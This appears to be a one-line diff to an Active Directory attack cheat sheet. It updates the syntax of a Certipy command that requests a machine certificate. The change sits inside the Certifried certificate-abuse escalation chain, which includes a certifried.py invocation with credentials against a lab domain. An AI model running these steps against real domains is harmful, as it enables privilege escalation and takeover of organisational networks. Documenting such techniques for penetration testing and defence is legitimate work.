@@ -1416,7 +1416,7 @@ python3 certifried.py range.net/peter:'Welcome1234' -dc-ip 192.168.86.182
 
 4. Request certificate with [Certipy](https://github.com/ly4k/Certipy)
 ```bash
-certipy req range.net/WIN-JLSLKICW6EP\$:'PY2nc0ubG8WT'@ca01.range.net -ca range-CA01-CA -template Machine
+certipy req -u 'WIN-JLSLKICW6EP\$' -p 'PY2nc0ubG8WT' -target ca01.range.net -ca range-CA01-CA -template Machine
 ```
 
 5. Authenticate with the requested certificate earlier
